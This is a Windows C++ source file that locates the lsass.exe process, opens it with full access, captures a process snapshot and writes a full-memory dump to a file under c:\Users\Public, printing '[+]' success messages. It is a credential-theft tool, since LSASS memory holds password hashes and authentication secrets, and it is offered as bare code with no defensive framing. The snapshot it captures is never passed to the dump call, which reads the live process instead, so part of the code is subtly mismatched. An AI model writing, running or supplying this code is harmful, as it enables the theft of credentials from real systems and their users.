#include <windows.h>
#include <DbgHelp.h>
#include <iostream>
#include <TlHelp32.h>
#include <processsnapshot.h>
#pragma comment(lib, "Dbghelp.lib")
#pragma comment(lib, "kernel32.lib")

using namespace std;

BOOL CALLBACK MyMiniDumpWriteDumpCallback(
    PVOID CallbackParam,
    const PMINIDUMP_CALLBACK_INPUT CallbackInput,
    PMINIDUMP_CALLBACK_OUTPUT CallbackOutput
)
{
    switch (CallbackInput->CallbackType)
    {
    case IsProcessSnapshotCallback:
        CallbackOutput->Status = S_FALSE;
        break;
    }
    return TRUE;
}

int main() {
    DWORD lsassPID = 0;
    HANDLE lsassHandle = NULL;
    HANDLE outFile = CreateFileW(L"c:\\Users\\Public\\lsasss.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (outFile == INVALID_HANDLE_VALUE) {
        cout << "CreateFile failed with error " << GetLastError() << endl;
        return 1;
    }

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        cout << "CreateToolhelp32Snapshot failed with error " << GetLastError() << endl;
        CloseHandle(outFile);
        return 1;
    }

    PROCESSENTRY32 processEntry = {};
    processEntry.dwSize = sizeof(PROCESSENTRY32);
    LPCSTR processName = "";

    if (Process32First(snapshot, &processEntry)) {
        do {
            processName = processEntry.szExeFile;
            if (_stricmp(processName, "lsass.exe") == 0) {
                lsassPID = processEntry.th32ProcessID;
                break;
            }
        } while (Process32Next(snapshot, &processEntry));

        if (lsassPID != 0) {
            cout << "[+] Got lsass.exe PID: " << lsassPID << endl;
        } else {
            cout << "lsass.exe not found" << endl;
            CloseHandle(snapshot);
            CloseHandle(outFile);
            return 1;
        }
    } else {
        cout << "Process32First failed with error " << GetLastError() << endl;
        CloseHandle(snapshot);
        CloseHandle(outFile);
        return 1;
    }

    CloseHandle(snapshot);

    lsassHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, lsassPID);
    if (lsassHandle == NULL) {
        cout << "OpenProcess failed with error " << GetLastError() << endl;
        CloseHandle(outFile);
        return 1;
    }

    HPSS snapshotHandle = NULL;
    DWORD flags = PSS_CAPTURE_VA_CLONE | PSS_CAPTURE_HANDLES | PSS_CAPTURE_HANDLE_NAME_INFORMATION | PSS_CAPTURE_HANDLE_BASIC_INFORMATION | PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION | PSS_CAPTURE_HANDLE_TRACE | PSS_CAPTURE_THREADS | PSS_CAPTURE_THREAD_CONTEXT | PSS_CAPTURE_THREAD_CONTEXT_EXTENDED | PSS_CREATE_BREAKAWAY | PSS_CREATE_BREAKAWAY_OPTIONAL | PSS_CREATE_USE_VM_ALLOCATIONS | PSS_CREATE_RELEASE_SECTION;
    MINIDUMP_CALLBACK_INFORMATION CallbackInfo;
    ZeroMemory(&CallbackInfo, sizeof(MINIDUMP_CALLBACK_INFORMATION));
    CallbackInfo.CallbackRoutine = MyMiniDumpWriteDumpCallback;
    CallbackInfo.CallbackParam = NULL;

    if (PssCaptureSnapshot(lsassHandle, (PSS_CAPTURE_FLAGS)flags, CONTEXT_ALL, &snapshotHandle) != ERROR_SUCCESS) {
        cout << "PssCaptureSnapshot failed with error " << GetLastError() << endl;
        CloseHandle(lsassHandle);
        CloseHandle(outFile);
        return 1;
    }

    BOOL isDumped = MiniDumpWriteDump(lsassHandle, lsassPID, outFile, MiniDumpWithFullMemory, NULL, NULL, &CallbackInfo);

    if (isDumped) {
        cout << "[+] lsass dumped successfully!" << endl;
    } else {
        cout << "MiniDumpWriteDump failed with error " << GetLastError() << endl;
    }

    PssFreeSnapshot(GetCurrentProcess(), snapshotHandle);
    CloseHandle(lsassHandle);
    CloseHandle(outFile);
    return 0;
}
